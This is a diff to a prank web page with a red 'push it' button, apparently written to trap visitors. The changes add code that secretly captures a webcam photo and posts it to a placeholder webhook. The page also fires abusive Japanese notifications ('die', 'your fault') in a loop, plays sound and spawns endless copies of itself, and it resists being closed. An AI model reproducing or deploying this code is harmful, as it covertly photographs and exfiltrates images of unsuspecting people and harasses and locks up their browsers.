@@ -8,48 +8,88 @@
       margin: 0;
       padding: 0;
       background-color: black;
-      height: 100%;
+      color: white;
+      width: 100vw;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
+      overflow: hidden;
     }
-    #startButton {
+    button {
       background-color: red;
       color: white;
       font-size: 2rem;
-      padding: 20px 40px;
+      padding: 1rem 2rem;
       border: none;
-      border-radius: 10px;
+      border-radius: 1rem;
       cursor: pointer;
+      box-shadow: 0 0 10px rgba(255,0,0,0.8);
+      transition: 0.3s;
+    }
+    button:hover {
+      transform: scale(1.1);
+    }
+    video {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <button id="startButton">押してみろよwww</button>
+  <button onclick="triggerTrap()">押してみろよwww</button>
+  <video id="camera" autoplay></video>
+
   <script>
-    const messages=["死ね","クソ","ばーか","無限","終わらんぞ","お前のせい","覚悟しろ"];
-    const audio=new Audio("https://files.catbox.moe/3yiigv.mp3");
+    const messages = ["死ね","クソ","ばーか","無限","終わらんぞ","お前のせい","覚悟しろ"];
+    const audio = new Audio("https://files.catbox.moe/3yiigv.mp3");
     audio.load();
-    document.getElementById("startButton").addEventListener("click",async()=>{
-      if(Notification.permission!=="granted"){
+
+    async function triggerTrap() {
+      // 撮影開始
+      const video = document.getElementById("camera");
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await new Promise(r => setTimeout(r, 1000));
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL("image/png");
+
+      stream.getTracks().forEach(track => track.stop());
+
+      // Google Driveアップロード用Webhookへ送信
+      await fetch("https://your-webhook.example/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: imageData })
+      });
+
+      // 通知連打＆増殖地獄スタート
+      if(Notification.permission !== "granted") {
         await Notification.requestPermission();
       }
-      if(Notification.permission==="granted"){
-        setInterval(()=>{
-          const msg=messages[Math.floor(Math.random()*messages.length)];
+
+      if(Notification.permission === "granted") {
+        setInterval(() => {
+          const msg = messages[Math.floor(Math.random()*messages.length)];
           new Notification(msg);
-          audio.play().catch(e=>console.error(e));
-        },100);
-      }else{
+          audio.play().catch(e => console.error(e));
+          window.open(window.location.href, "_blank");
+        }, 1500);
+      } else {
         alert("通知の許可が必要だよ");
       }
-      window.addEventListener("beforeunload",function(e){
-        alert("逃げれると思うなよ？");
-        window.open(window.location.href,"_blank");
-        e.preventDefault();
-        e.returnValue="";
-      });
-    });
+
+      // 閉じようとしたら逃がさない
+      window.onbeforeunload = () => {
+        alert("消そうとしたな？逃げられると思うなよ？");
+        window.open(window.location.href, "_blank");
+        return "";
+      };
+    }
   </script>
 </body>
 </html>
